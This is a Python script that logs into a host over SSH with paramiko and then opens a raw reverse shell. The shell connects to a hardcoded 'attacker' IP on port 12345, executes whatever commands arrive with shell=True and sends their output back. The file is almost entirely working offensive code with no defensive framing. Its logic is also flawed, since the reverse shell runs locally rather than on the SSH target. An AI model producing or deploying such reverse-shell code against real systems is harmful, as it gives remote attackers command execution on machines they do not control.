import paramiko
import getpass
import socket
import subprocess

# Function to establish reverse shell
def connect_reverse_shell(attacker_ip):
    attacker_port = 12345  # Port you want to listen on your attacker machine
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"Attempting to connect to {attacker_ip}:{attacker_port}...")
        s.connect((attacker_ip, attacker_port))
        print("Connection established.")
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            if command:
                proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout_value = proc.stdout.read() + proc.stderr.read()
                s.send(stdout_value if stdout_value else b"Command executed with no output.")
    except Exception as e:
        print("Failed to establish reverse shell:", e)
    finally:
        s.close()

# Main function
def main():
    host = input("Enter hostname or IP address: ")
    username = input("Enter username: ")
    password = getpass.getpass("Enter password: ")

    # Establish SSH connection
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh_client.connect(hostname=host, username=username, password=password)
        print("SSH connection established successfully.\n")
        
        attacker_ip = "192.168.178.1"  # Directly set the attacker's IP address here
        connect_reverse_shell(attacker_ip)
    except paramiko.AuthenticationException:
        print("Authentication failed. Please check your credentials.")
    except paramiko.SSHException as ssh_ex:
        print(f"SSH error: {ssh_ex}")
    finally:
        ssh_client.close()

if __name__ == "__main__":
    main()
